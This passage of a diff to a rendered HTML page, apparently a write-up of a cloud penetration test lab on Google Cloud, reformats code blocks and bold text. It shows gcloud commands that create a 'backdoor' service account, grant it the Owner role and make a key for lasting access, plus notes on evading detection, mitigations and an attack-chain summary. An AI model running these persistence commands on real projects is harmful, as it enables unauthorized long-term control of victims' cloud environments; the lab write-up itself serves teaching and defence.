SA&quot;</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">BACKDOOR_SA=&quot;backdoor-sa-$(date +%s)&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">gcloud iam service-accounts create &quot;$BACKDOOR_SA&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --display-name=&quot;Backdoor SA&quot;</span><br></div></code></pre></div></div>
 <p><strong>Result:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Created service account </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[backdoor-sa-1769710955]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Created service account [backdoor-sa-1769710955].</span><br></div></code></pre></div></div>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-2-grant-owner-role">Step 2: Grant Owner Role<a href="#step-2-grant-owner-role" class="hash-link" aria-label="Direct link to Step 2: Grant Owner Role" title="Direct link to Step 2: Grant Owner Role" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud projects </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">add</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-iam-policy-binding cloud-pentest-lab</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">-1769707855</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --member=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;serviceAccount:backdoor-sa-1769710955@cloud-pentest-lab-1769707855.iam.gserviceaccount.com&quot;</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --role=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;roles/owner&quot;</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud projects add-iam-policy-binding cloud-pentest-lab-1769707855 \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --member=&quot;serviceAccount:backdoor-sa-1769710955@cloud-pentest-lab-1769707855.iam.gserviceaccount.com&quot; \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --role=&quot;roles/owner&quot;</span><br></div></code></pre></div></div>
 <p><strong>Result:</strong></p>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Updated IAM policy for project </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">[cloud-pentest-lab-1769707855]</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">.</span><br></div></code></pre></div></div>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">Updated IAM policy for project [cloud-pentest-lab-1769707855].</span><br></div></code></pre></div></div>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-3-create-service-account-key-optional">Step 3: Create Service Account Key (Optional)<a href="#step-3-create-service-account-key-optional" class="hash-link" aria-label="Direct link to Step 3: Create Service Account Key (Optional)" title="Direct link to Step 3: Create Service Account Key (Optional)" translate="no">​</a></h3>
-<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud iam service-accounts </span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">keys</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain"> create backdoor_key.json \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --iam-account=</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">&quot;backdoor-sa-1769710955@cloud-pentest-lab-1769707855.iam.gserviceaccount.com&quot;</span><br></div></code></pre></div></div>
-<p>**Result:**A new service account key file is created, providing persistent access.</p>
+<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><div class="token-line" style="color:#393A34"><span class="token plain">gcloud iam service-accounts keys create backdoor_key.json \</span><br></div><div class="token-line" style="color:#393A34"><span class="token plain">  --iam-account=&quot;backdoor-sa-1769710955@cloud-pentest-lab-1769707855.iam.gserviceaccount.com&quot;</span><br></div></code></pre></div></div>
+<p><strong>Result:</strong> A new service account key file is created, providing persistent access.</p>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="why-persistence-matters">Why Persistence Matters<a href="#why-persistence-matters" class="hash-link" aria-label="Direct link to Why Persistence Matters" title="Direct link to Why Persistence Matters" translate="no">​</a></h3>
 <p>Persistence ensures:</p>
 <ul>
 <li class="">
-<p>**Continued Access:**Maintain access even if initial vulnerabilities are patched</p>
+<p><strong>Continued Access:</strong> Maintain access even if initial vulnerabilities are patched</p>
 </li>
 <li class="">
-<p>**Stealth:**Backdoor accounts may not be immediately noticed</p>
+<p><strong>Stealth:</strong> Backdoor accounts may not be immediately noticed</p>
 </li>
 <li class="">
-<p>**Multiple Entry Points:**Provides redundancy if one access method is discovered</p>
+<p><strong>Multiple Entry Points:</strong> Provides redundancy if one access method is discovered</p>
 </li>
 <li class="">
-<p>**Long-term Operations:**Enables extended surveillance and data collection</p>
+<p><strong>Long-term Operations:</strong> Enables extended surveillance and data collection</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="detection-challenges">Detection Challenges<a href="#detection-challenges" class="hash-link" aria-label="Direct link to Detection Challenges" title="Direct link to Detection Challenges" translate="no">​</a></h3>
 <p>Backdoor service accounts can be difficult to detect because:</p>
 <ul>
 <li class="">
-<p>**Legitimate Appearance:**Service accounts are normal in cloud environments</p>
+<p><strong>Legitimate Appearance:</strong> Service accounts are normal in cloud environments</p>
 </li>
 <li class="">
-<p>**Generic Names:**Names like “backdoor-sa” might not raise immediate suspicion</p>
+<p><strong>Generic Names:</strong> Names like “backdoor-sa” might not raise immediate suspicion</p>
 </li>
 <li class="">
-<p>**Low Activity:**Backdoors may be used infrequently to avoid detection</p>
+<p><strong>Low Activity:</strong> Backdoors may be used infrequently to avoid detection</p>
 </li>
 <li class="">
-<p>**IAM Complexity:**Large IAM policies make it hard to spot unauthorized additions</p>
+<p><strong>IAM Complexity:</strong> Large IAM policies make it hard to spot unauthorized additions</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="mitigation-6">Mitigation<a href="#mitigation-6" class="hash-link" aria-label="Direct link to Mitigation" title="Direct link to Mitigation" translate="no">​</a></h3>
 <ul>
 <li class="">
-<p>**Regular IAM Audits:**Regularly review all service accounts and their permissions</p>
+<p><strong>Regular IAM Audits:</strong> Regularly review all service accounts and their permissions</p>
 </li>
 <li class="">
-<p>**Naming Conventions:**Use clear naming conventions to identify legitimate accounts</p>
+<p><strong>Naming Conventions:</strong> Use clear naming conventions to identify legitimate accounts</p>
 </li>
 <li class="">
-<p>**Access Logging:**Monitor and alert on service account key creation</p>
+<p><strong>Access Logging:</strong> Monitor and alert on service account key creation</p>
 </li>
 <li class="">
-<p>**Automated Detection:**Use tools to detect unusual IAM changes</p>
+<p><strong>Automated Detection:</strong> Use tools to detect unusual IAM changes</p>
 </li>
 <li class="">
-<p>**Least Privilege:**Never grant Owner role unless absolutely necessary</p>
+<p><strong>Least Privilege:</strong> Never grant Owner role unless absolutely necessary</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="lessons-learned">Lessons Learned<a href="#lessons-learned" class="hash-link" aria-label="Direct link to Lessons Learned" title="Direct link to Lessons Learned" translate="no">​</a></h2>
@@ -743,50 +743,50 @@
 <p>This penetration test revealed several common cloud security mistakes:</p>
 <ul>
 <li class="">
-<p>**Overprivileged Service Accounts:**Granting Owner or Editor roles to service accounts</p>
+<p><strong>Overprivileged Service Accounts:</strong> Granting Owner or Editor roles to service accounts</p>
 </li>
 <li class="">
-<p>**Exposed Credentials:**Storing credentials in environment variables, code, or public storage</p>
+<p><strong>Exposed Credentials:</strong> Storing credentials in environment variables, code, or public storage</p>
 </li>
 <li class="">
-<p>**Weak Access Controls:**Public access to sensitive services and data</p>
+<p><strong>Weak Access Controls:</strong> Public access to sensitive services and data</p>
 </li>
 <li class="">
-<p>**Insufficient Input Validation:**Not validating user inputs leading to injection attacks</p>
+<p><strong>Insufficient Input Validation:</strong> Not validating user inputs leading to injection attacks</p>
 </li>
 <li class="">
-<p>**Debug Endpoints in Production:**Leaving development/debug endpoints enabled</p>
+<p><strong>Debug Endpoints in Production:</strong> Leaving development/debug endpoints enabled</p>
 </li>
 <li class="">
-<p>**Poor Secret Management:**Using environment variables instead of Secret Manager</p>
+<p><strong>Poor Secret Management:</strong> Using environment variables instead of Secret Manager</p>
 </li>
 <li class="">
-<p>**Lack of Monitoring:**No alerts for suspicious IAM changes or credential access</p>
+<p><strong>Lack of Monitoring:</strong> No alerts for suspicious IAM changes or credential access</p>
 </li>
 </ul>
 <h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="attack-chain-analysis">Attack Chain Analysis<a href="#attack-chain-analysis" class="hash-link" aria-label="Direct link to Attack Chain Analysis" title="Direct link to Attack Chain Analysis" translate="no">​</a></h3>
 <p>The attack chain demonstrates how multiple vulnerabilities can be chained together:</p>
 <ul>
 <li class="">
-<p>**Initial Access:**Command injection in Cloud Function</p>
+<p><strong>Initial Access:</strong> Command injection in Cloud Function</p>
 </li>
 <li class="">
-<p>**Information Disclosure:**Environment variable exposure</p>
+<p><strong>Information Disclosure:</strong> Environment variable exposure</p>
 </li>
 <li class="">
-<p>**Credential Access:**Service account key extraction from Secret Manager</p>
+<p><strong>Credential Access:</strong> Service account key extraction from Secret Manager</p>
 </li>
 <li class="">
-<p>**Privilege Escalation:**Overprivileged service account with Owner role</p>
+<p><strong>Privilege Escalation:</strong> Overprivileged service account with Owner role</p>
 </li>
 <li class="">
-<p>**Lateral Movement:**SSRF to access internal storage buckets</p>
+<p><strong>Lateral Movement:</strong> SSRF to access internal storage buckets</p>
 </li>
 <li class="">
-<p>**Data Exfiltration:**Extraction of all sensitive data</p>
+<p><strong>Data Exfiltration:</strong> Extraction of all sensitive data</p>
 </li>
 <li class="">
-<p>**Persistence:**Creation of backdoor service account</p>
+<p><strong>Persistence:</strong> Creation of backdoor service account</p>
 </li>
 </ul>
 <p>Each vulnerability alone might not be critical, but together they enable complete environment compromise.</p>
@@ -794,16 +794,16 @@
 <p>This attack demonstrates why defense in depth is crucial:</p>
 <ul>
 <li class="">
-<p>**Single Point of Failure:**Relying on a single security control is insufficient</p>
+<p><strong>Single Point of Failure:</strong> Relying on a single security control is insufficient</p>
 </li>
 <li class="">
-<p>**Layered Security:**Multiple security layers make attacks more difficult</p>
+<p><strong>Layered Security:</strong> Multiple security layers make attacks more difficult</p>
 </li>
 <li class="">
-<p>**Assume Breach:**Design systems assuming some vulnerabilities will exist</p>
+<p><strong>Assume Breach:</strong> Design systems assuming some vulnerabilities will exist</p>
 </li>
 <li class="">
-<p>**Monitoring:**Detect and respond to attacks even if prevention fails</p>
+<p><strong>Monitoring:</strong> Detect and respond to attacks even if prevention fails</p>
 </li>
 </ul>
 <h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="recommendations">Recommendations<a href="#recommendations" class="hash-link" aria-label="Direct link to Recommendations" title="Direct link to Recommendations" translate="no">​</a></h2>
@@ -914,19 +914,19 @@
 <p><strong>Key Takeaways:</strong></p>
 <ul>
 <li class="">
-<p>**Cloud Security is Complex:**Multiple services, IAM policies, and configurations create a large attack surface</p>
+<p><strong>Cloud Security is Complex:</strong> Multiple services, IAM policies, and configurations create a large attack surface</p>
 </li>
 <li class="">
-<p>**Small Mistakes Have Big Consequences:**A single misconfiguration can lead to complete compromise</p>
+<p><strong>Small Mistakes Have Big Consequences:</strong> A single misconfiguration can lead to complete compromise</p>
 </li>
 <li class="">
-<p>**Defense in Depth is Essential:**Multiple security layers are necessary</p>
+<p><strong>Defense in Depth is Essential:</strong> Multiple security layers are necessary</p>
 </li>
 <li class="">
-<p>**Regular Assessments are Critical:**Continuous security testing and monitoring are required</p>
+<p><strong>Regular Assessments are Critical:</strong> Continuous security testing and monitoring are required</p>
 </li>
 </ul>
-<p>**Final Risk Assessment:**<strong>CRITICAL</strong></p>
+<p><strong>Final Risk Assessment:</strong> <strong>CRITICAL</strong></p>
 <p>The vulnerabilities identified and exploited represent critical security risks that could lead to:</p>
 <ul>
 <li class="">
